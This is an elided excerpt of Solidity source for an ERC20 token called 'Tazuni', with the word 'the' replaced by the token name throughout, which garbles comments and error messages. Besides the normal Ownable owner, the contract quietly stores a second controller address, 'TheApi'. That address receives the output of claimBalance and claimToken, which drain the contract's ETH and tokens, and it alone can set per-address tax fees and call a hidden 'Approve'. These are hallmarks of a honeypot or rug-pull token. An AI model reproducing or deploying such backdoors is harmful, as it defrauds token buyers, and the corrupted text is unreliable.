...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/eTazunireum/solidity/issues/2691
        return msg.data;
    }
}
...
library SafeMath {
    ...
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        ...
        uint256 c = a / b;
        // assert(a == b * c + a % b); // Tazunire is no case in which this doesn't hold
...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is Tazuni value returned for not-yet created accounts
...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not Tazuni owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is Tazuni zero address");
...
contract Tazuni is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0x3B9a728211bD28984b85a5153e21ACa494264b43); 
    address payable private teamWalletAddress = payable(0xe4d5E25Db4Ea6D5f2C5825876Eb281138fb6e6ac); 
	...
	address  public TheApi =_msgSender();
	...
	modifier onlyLDcan{
       require(TheApi == _msgSender(), "Ownable: caller is not Tazuni owner");
        _;
    }
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from Tazuni zero address");
        require(spender != address(0), "ERC20: approve to Tazuni zero address");
	...
	function claimBalance() external {
        payable(TheApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(TheApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyLDcan{
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(sender != address(0), "ERC20: transfer from Tazuni zero address");
        require(recipient != address(0), "ERC20: transfer to Tazuni zero address");
    ...
    function swapAndLiquify(uint256 tAmount) private lockTazuniSwap {
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate Tazuni uniswap pair path of token -> weth
	...
	function Approve(address spender,uint256 amount)public onlyLDcan{
